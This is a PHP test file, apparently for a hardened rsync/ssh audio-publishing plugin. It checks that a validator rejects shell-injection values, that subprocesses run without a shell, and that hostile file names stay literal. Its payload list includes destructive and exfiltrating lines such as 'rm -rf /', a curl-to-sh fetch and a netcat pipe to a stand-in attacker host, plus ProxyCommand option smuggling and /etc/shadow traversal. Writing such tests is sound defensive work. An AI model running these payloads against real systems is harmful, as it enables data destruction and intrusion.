<?php

declare(strict_types=1);

namespace LofTest\Cases;

use LofAudioSupply\Config\Validator;
use LofAudioSupply\Process\ProcessRunner;
use LofTest\Estate;
use LofTest\TestCase;

/**
 * The payload corpus.
 *
 * Every entry below is something the pre-hardening plugin would have
 * interpolated straight into `exec("rsync -avz --delete $src/ $user@$host:$dest/")`
 * or `exec("ssh ... $user@$host 'echo SUCCESS'")`. Each one must now be
 * refused by validation, and separately, nothing that does get through can be
 * re-read as a command, because no shell is ever involved.
 */
final class InjectionTest extends TestCase
{
    private Estate $estate;
    private Validator $validator;

    public function setUp(): void
    {
        $this->estate = new Estate($this->makeTempRoot('estate'));
        $this->validator = new Validator($this->estate->policy);
    }

    /** @return list<string> */
    public static function payloads(): array
    {
        return [
            // Command chaining and substitution.
            '; rm -rf /',
            '&& curl http://attacker.invalid/x.sh | sh',
            '| nc attacker.invalid 4444',
            '$(id)',
            '`id`',
            '${IFS}id',
            "\n/usr/bin/id",
            "\r\nid",
            'a; /bin/sh -c id',
            'x & sleep 60 &',
            'x || wget http://attacker.invalid',
            '>(id)',
            '<(id)',
            // Quote breaking, aimed at the old single-quoted ssh command.
            "'; id; '",
            "' 'echo pwned'",
            '" ; id ; "',
            // Option smuggling into rsync/ssh.
            '--delete',
            '-e/bin/sh',
            '-oProxyCommand=id',
            '--rsh=/bin/sh',
            '--remove-source-files',
            // Traversal and absolute escapes.
            '../../../../etc/shadow',
            '/etc/passwd',
            '/home/fpp/media/music/../../../etc',
            // Control characters and NULs.
            "abc\0def",
            "abc\x07def",
            "abc\x1b[31mdef",
            // Remote spec confusion.
            'attacker.invalid:/tmp',
            'root@attacker.invalid',
            'rsync://attacker.invalid/mod',
            // Whitespace splitting.
            'a b',
            "tab\there",
        ];
    }

    /** @param array<string,mixed> $overrides @return array<string,mixed> */
    private function base(array $overrides = []): array
    {
        return $overrides + [
            'enabled' => true,
            'source_path' => $this->estate->musicRoot,
            'publication_root' => $this->estate->publicationRoot,
            'distribution_enabled' => false,
            'destination_host' => '',
            'destination_port' => 22,
            'destination_path' => '/var/www/lof-audio',
            'service_user' => 'lof-audio',
            'ssh_key_path' => '',
            'sync_interval_seconds' => 60,
            'retain_generations' => 5,
            'quarantine_retention_days' => 30,
        ];
    }

    public function testEveryPayloadIsRefusedInEveryStringField(): void
    {
        $fields = ['source_path', 'publication_root', 'destination_host', 'destination_path', 'service_user', 'ssh_key_path'];
        $accepted = [];
        foreach ($fields as $field) {
            foreach (self::payloads() as $payload) {
                try {
                    $this->validator->validate($this->base([$field => $payload]));
                    $accepted[] = $field . ' <= ' . str_replace(["\0", "\n", "\r"], ['\0', '\n', '\r'], $payload);
                } catch (\LofAudioSupply\LofAudioException $e) {
                    // Refused, which is the only acceptable outcome.
                }
            }
        }
        $this->assertCount(
            0,
            $accepted,
            'These hostile values were accepted: ' . implode(' | ', $accepted)
        );
    }

    public function testEveryPayloadIsRefusedInEveryNumericField(): void
    {
        $fields = ['destination_port', 'sync_interval_seconds', 'retain_generations', 'quarantine_retention_days'];
        $accepted = [];
        foreach ($fields as $field) {
            foreach (self::payloads() as $payload) {
                try {
                    $this->validator->validate($this->base([$field => $payload]));
                    $accepted[] = $field . ' <= ' . $payload;
                } catch (\LofAudioSupply\LofAudioException $e) {
                }
                // "22; rm -rf /" style values with a leading number are the
                // dangerous shape, because a naive (int) cast accepts them.
                try {
                    $this->validator->validate($this->base([$field => '22' . $payload]));
                    $accepted[] = $field . ' <= 22' . $payload;
                } catch (\LofAudioSupply\LofAudioException $e) {
                }
            }
        }
        $this->assertCount(0, $accepted, 'These hostile numeric values were accepted: ' . implode(' | ', $accepted));
    }

    public function testProcessRunnerRefusesBinariesOutsideTheAllowlist(): void
    {
        $runner = new ProcessRunner(['/bin/echo']);
        $this->assertRefused('process.binary_not_allowed', static fn () => $runner->assertArgvAcceptable(['/bin/sh', '-c', 'id']));
        $this->assertRefused('process.binary_not_allowed', static fn () => $runner->assertArgvAcceptable(['/usr/bin/env', 'id']));
        $this->assertRefused('process.binary_not_allowed', static fn () => $runner->assertArgvAcceptable(['echo', 'hi']));
        $this->assertRefused('process.empty_argv', static fn () => $runner->assertArgvAcceptable([]));
        $this->assertRefused('process.arg_nul_byte', static fn () => $runner->assertArgvAcceptable(['/bin/echo', "a\0b"]));
        $this->assertRefused('process.arg_empty', static fn () => $runner->assertArgvAcceptable(['/bin/echo', '']));
    }

    public function testArgumentsReachTheChildLiterally(): void
    {
        if (!is_executable('/bin/echo')) {
            $this->skip('/bin/echo is not available on this host');
        }
        $runner = new ProcessRunner(['/bin/echo']);

        foreach (['$(id)', '`id`', '; id', '&& id', '| id', '$HOME', '*', '~'] as $payload) {
            $result = $runner->run(['/bin/echo', $payload], 10);
            $this->assertTrue($result->succeeded(), 'echo should succeed for ' . $payload);
            // The child received one argument, printed verbatim. If a shell
            // had been involved the payload would have been expanded or run.
            $this->assertSame($payload, trim($result->stdout), 'Argument must survive verbatim: ' . $payload);
        }

        // uid 0 output would mean a substitution actually ran.
        $result = $runner->run(['/bin/echo', '$(id -u)'], 10);
        $this->assertStringNotContains('uid=', $result->stdout);
    }

    public function testEnvironmentDoesNotForwardAnAgentSocket(): void
    {
        $environment = ProcessRunner::defaultEnvironment();
        $this->assertFalse(array_key_exists('SSH_AUTH_SOCK', $environment));
        $this->assertFalse(array_key_exists('LD_PRELOAD', $environment));
        $this->assertFalse(array_key_exists('IFS', $environment));
        $this->assertSame('/usr/bin:/bin', $environment['PATH']);
    }

    public function testHostileFileNamesAreTreatedAsDataNotCommands(): void
    {
        // Files whose *names* are payloads. They must be handled literally:
        // hashed, copied, manifested, and never interpreted.
        $this->estate->seedMusic([
            '$(id).mp3' => 'one',
            'track; rm -rf tmp.mp3' => 'two',
            "quote'name.mp3" => 'three',
            'normal.mp3' => 'four',
        ]);

        $settings = $this->estate->settings();
        $result = $this->estate->publisher($settings)->publish();

        $this->assertSame('published', $result->outcome);
        $this->assertSame(4, $result->assetCount);

        $generations = $this->estate->generations($settings);
        $current = (string) $generations->currentGeneration();
        foreach (['$(id).mp3', 'track; rm -rf tmp.mp3', "quote'name.mp3", 'normal.mp3'] as $name) {
            $this->assertTrue(
                is_file($generations->generationDir($current) . '/' . $name),
                'Literal file name should have been published: ' . $name
            );
        }
        // Nothing executed: the source tree is untouched apart from what we seeded.
        $this->assertTrue(is_dir($this->estate->musicRoot));
        $this->assertTrue(is_file($this->estate->musicRoot . '/normal.mp3'));
    }
}
